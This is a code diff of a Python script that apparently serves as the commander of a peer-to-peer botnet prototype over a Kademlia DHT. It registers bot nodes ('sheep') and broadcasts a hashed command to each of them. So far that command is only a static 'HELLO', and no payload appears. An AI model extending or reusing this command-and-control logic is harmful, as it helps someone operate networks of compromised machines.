@@ -9,6 +9,7 @@ import asyncio, os, sys, logging, pdb, functools
 from subprocess import check_call
 from asyncio.tasks import ensure_future
 import hashlib
+import pprint as pp
 from kademlia.network import Server
 SECRET="TheSecretKey"
 
@@ -31,10 +32,10 @@ log.addHandler(handler)
 class Shepard():
     # Key is hash of secret string
     def __init__(self, kserver, key):
-        self.kserver = kserver
-        self.key = key
-        self.sheeps = {}
-        self.count = 0
+        self._kserver = kserver
+        self._key = key
+        self._sheeps = {}
+        self._count = 0
         #TODO: add looping call to check for new nodes
         #self.sheeploop = loop.call_soon_threadsafe(checknewsheep())
         #self.sheeploop = loop.call_later(8, functools.partial(self.checknewsheep())) 
@@ -47,22 +48,24 @@ class Shepard():
         async def addsheep(val): 
             if val:
                 # new sheep found
-                if val not in self.sheeps:
-                    # Create new UUID for node
+                if val not in self._sheeps:
+                    # Create new UUID for node stored on commander node
                     newval = get_hash(str(val))
-                    self.sheeps[val] = newval
-                    print("\nSetting Key:\nNodeID: {}\nValue: {}\n".format(val, newval))
+                    self._sheeps[val] = newval
+                    print("\nSetting Key:\nSheep NodeID: {}\nSheep CMD entry Key: {}\n".format(val, newval))
                     ## Set the NODEID 'val' of nearest neightbor to newval 'cmdkey of the bot'
-                    result = await self.kserver.set(self.sheeps[val], str(val))
-                    #TODO: Commander hangs after set, node goes into loop saying that is has acked the network, and recieved a command, but not command is ever run.
+                    result = await self._kserver.set(self._sheeps[val], str(val))
+                    #RESOLVED: Commander hangs after set, node goes into loop saying that is has acked the network, and recieved a command, but not command is ever run.
                     # Update: I dont think the task ever returns from await state
                     # Update: added return statements 
                     print("Added a new sheep")
+                    pp.pprint(leader._sheeps)
                     return result
-                print("No new sheep")
+                #print("No new sheep")
+                asyncio.sleep(5)
                 return False    
         #pdb.set_trace()
-        result = await self.kserver.get(self.key)
+        result = await self._kserver.get(self._key)
         return await addsheep(result)
         
     """
@@ -72,13 +75,12 @@ class Shepard():
         cmd="HELLO"
         #print()
         #Iterate through sheeps list and send command to all sheep
-        while await self.checknewsheep():
-            for key, val in self.sheeps.items():
+        while await self.checknewsheep(): #Loop while this is true
+            for key, val in self._sheeps.items():
                 #print("\nKEY: {} VAL: {}\nPOSSIBLE ITEMS {}\n\n".format(key,val,self.sheeps.items()))
-                output= "Starting HELLO for bot {0}\n".format(key)
-                print(output)
-                botcmdtorun = get_hash(cmd)
-                await self.kserver.set(val,botcmdtorun)
+                print("Starting HELLO for bot ID {}\nCMD_VALUE:{}".format(key,val))
+                botcmdtorun = get_hash(cmd) #"HELLO" is currently static command -> sayHello.py
+                await self._kserver.set(val,botcmdtorun)
                 asyncio.sleep(5)
             if await self.checknewsheep():
                 break
@@ -108,10 +110,26 @@ loop.run_until_complete(kserver.listen(myport))
 loop.run_until_complete(kserver.bootstrap([(bootstrap_ip, bootstrap_port)]))
 
 leader = Shepard(kserver, NETKEY)
+#from botnet_dev import bootstrapDone #setup, callhome
+
+
 
 try:
     #pdb.set_trace()
-    loop.run_until_complete(leader.sheepGreeter())
+    #loop.run_until_complete(setup(kserver)) #This returns bool, or nonetype
+    #fi 
+    loop_counter=0   
+    while True:
+        loop_counter+=1
+        #print("Started a new loop numer:\n{}".format(loop_counter))
+        loop.run_until_complete(leader.sheepGreeter())
+        #pp.pprint(vars(leader))
+        #pp.pprint(leader._sheeps)
+        import time
+        #time.sleep(5)
+        #print(leader._sheeps)
+        if loop_counter > 1000000: #kill before infitety happens
+            break
     loop.run_forever()
 except KeyboardInterrupt:
     pass
